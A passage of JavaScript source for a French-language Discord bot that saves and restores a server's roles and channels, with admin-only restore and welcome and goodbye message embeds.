          id: role.id.toString(),
          name: role.name,
          color: role.color,
          hoist: role.hoist,
          permissions: role.permissions.bitfield.toString(),
          mentionable: role.mentionable
        });
      });

    guild.channels.cache
      .sort((a, b) => a.rawPosition - b.rawPosition)
      .forEach(channel => {
        backup.channels.push({
          id: channel.id.toString(),
          name: channel.name,
          type: channel.type,
          parent: channel.parentId ? channel.parentId.toString() : null,
          position: channel.rawPosition,
          permission_overwrites: channel.permissionOverwrites?.cache.map(po => ({
            id: po.id,
            type: po.type,
            allow: po.allow.bitfield.toString(),
            deny: po.deny.bitfield.toString()
          })) || []
        });
      });

    const filename = `backup_${guild.id}.json`;
    fs.writeFileSync(filename, JSON.stringify(backup, null, 2));

    message.reply(`Sauvegarde du serveur **${guild.name}** effectuée.\nNom : \`${backup.name}\`\nBoosts : \`${backup.premiumSubscriptionCount}\` (Niveau ${backup.premiumTier})\nFichier : \`${filename}\``);
  }

  // +restorebackup
    if (message.content.startsWith('+restorebackup')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return safeReply("Tu n'as pas les permissions pour faire ça.");
    }

    const args = message.content.split(' ');
    const backupId = args[1];
    if (!backupId) return safeReply("Tu dois fournir l'identifiant de la backup : `+restorebackup [id]`");

    const file = `backup_${backupId}.json`;
    if (!fs.existsSync(file)) return safeReply(`Aucun fichier trouvé pour \`${backupId}\``);

    const data = JSON.parse(fs.readFileSync(file));

    try {
      await message.guild.setName(data.name);

      if (data.icon) {
        await message.guild.setIcon(data.icon).catch(() => {});
      }

      for (const channel of message.guild.channels.cache.values()) {
        await channel.delete().catch(() => {});
      }

      for (const role of message.guild.roles.cache.values()) {
        if (role.name !== "@everyone") await role.delete().catch(() => {});
      }

      const roleMap = {};
      for (const r of data.roles) {
        const newRole = await message.guild.roles.create({
          name: r.name,
          color: r.color,
          hoist: r.hoist,
          permissions: BigInt(r.permissions),
          mentionable: r.mentionable
        });
        roleMap[r.id] = newRole;
      }

      // Recréer les catégories
      const categoryMap = {};
      for (const ch of data.channels.filter(c => c.type === ChannelType.GuildCategory)) {
        const cat = await message.guild.channels.create({
          name: ch.name,
          type: ChannelType.GuildCategory,
          position: ch.position
        });
        categoryMap[ch.id] = cat;
      }

      const validTypes = [
        ChannelType.GuildText,
        ChannelType.GuildVoice,
        ChannelType.GuildStageVoice,
        ChannelType.GuildDirectory
      ];

      for (const ch of data.channels.filter(c => c.type !== ChannelType.GuildCategory && validTypes.includes(c.type))) {
        await message.guild.channels.create({
          name: ch.name,
          type: ch.type,
          parent: ch.parent && categoryMap[ch.parent] ? categoryMap[ch.parent].id : null,
          position: ch.position,
          permissionOverwrites: ch.permission_overwrites?.map(po => {
            let id = po.id;
            if (roleMap[id]) id = roleMap[id].id;
            return {
              id,
              type: po.type,
              allow: BigInt(po.allow),
              deny: BigInt(po.deny)
            };
          }) || []
        });
      }

      await safeReply(`Serveur restauré depuis la backup \`${backupId}\` avec succès.`);
    } catch (err) {
      console.error(err);
      await safeReply("Une erreur est survenue pendant la restauration.");
    }
  }

  // +testwelcome
  if (message.content === '+testwelcome') {
    client.emit('guildMemberAdd', message.member);
    message.reply("Message de bienvenue simulé");
    return;
  }

  // +testbyebye
  if (message.content === '+testbyebye') {
    const member = message.member || message.guild.members.cache.get(message.author.id);
    if (!member) return message.reply("Impossible de trouver le membre.");
    client.emit('guildMemberRemove', member);
    message.reply("Message de bye-bye simulé");
    return;
  }
});

// Sysème de bienvenue
const WELCOME_CHANNEL_ID = "1408721357528760362"; // Remplace par l'ID de ton salon de bienvenue

client.on('guildMemberAdd', async member => {
  const channel = member.guild.channels.cache.get(WELCOME_CHANNEL_ID);
  if (!channel) return console.error("Salon de bienvenue introuvable.");

  const embed = {
    title: "Nouveau Arrivant !",
    description: `> Salut <@${member.id}>, bienvenue sur **${member.guild.name}** !\n> N'hésite pas à lire le **règlement** et à te **présenter** 😉 !\n> Nous sommes maintenant **${member.guild.memberCount} membres !**`,
    color: 0xFF0000, // rouge
    thumbnail: {
      url: member.user.displayAvatarURL({ dynamic: true })
    },
    footer: {
      text: "TarekShop - Gestion"
    },
    timestamp: new Date()
  };

  channel.send({ embeds: [embed] }).catch(console.error);
});

const PING_CHANNEL = "1344588705536675873";

client.on("guildMemberAdd", async (member) => {
  const channel = member.guild.channels.cache.get(PING_CHANNEL);
  if (!channel) return console.error("Salon de ping introuvable.");

  const embed = new EmbedBuilder()
    .setColor("#ff0000")
    .setTitle("Bienvenue / Welcome")
    .setDescription(
      `🇫🇷 Salut ${member}, n'hésite pas à prendre tes **rôles** pour avoir **accès à certaines parties du serveur** !\n\n` +
      `🇬🇧 Hey ${member}, feel free to grab your **roles** to **access some parts of the server** !`
    )
    .setFooter({ text: "Nous sommes heureux / We’re glad to have you here!" });

  const sentMessage = await channel.send({ embeds: [embed] });

  const pingMsg = await channel.send(`${member}`);
  setTimeout(() => {
    pingMsg.delete().catch(() => {});
  }, 1000); // Supprime le message de ping après 1sec

  setTimeout(() => {
    sentMessage.delete().catch(() => {}); // Supprime l'embed après 2 minutes
  }, 120000);
});

// Sysème de bye-bye
const BYEBYE_CHANNEL_ID = "1408721357528760362"; // Remplace par l'ID de ton salon de bye-bye

client.on('guildMemberRemove', async member => {
  const channel = member.guild.channels.cache.get(BYEBYE_CHANNEL_ID);
  if (!channel) return console.error("Salon de bienvenue introuvable.");

  const embed = {
    title: "Membre Parti...",
    description: `> Au **revoir <@${member.id}> !**\n> **Merci** d'avoir été avec nous sur **${member.guild.name}**.\n> Nous sommes maintenant **${member.guild.memberCount} membres.**`,
    color: 0x00FF00,
    thumbnail: {
      url: member.user.displayAvatarURL({ dynamic: true })
    },
    footer: {
      text: "TarekShop - Gestion"
    },
    timestamp: new Date()
  };

  channel.send({ embeds: [embed] }).catch(console.error);
});

client.login(process.env.TOKEN);